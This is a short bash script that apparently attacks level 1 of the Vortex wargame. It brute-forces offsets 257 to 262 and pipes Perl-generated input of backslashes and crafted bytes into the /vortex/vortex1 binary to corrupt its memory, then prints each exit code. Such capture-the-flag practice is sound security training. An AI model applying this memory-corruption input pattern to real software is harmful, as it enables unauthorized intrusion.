#!/bin/bash

for f in $(seq 257 1 262)
do 
	echo "Trying $f";

	echo 'print "\\" x ' $f '. "\x1a" x 4 . "\xca" x 4 . "A". "\n" x 0 ;'| perl - | /vortex/vortex1;

	echo -e "ret: $?\n\n";
 done

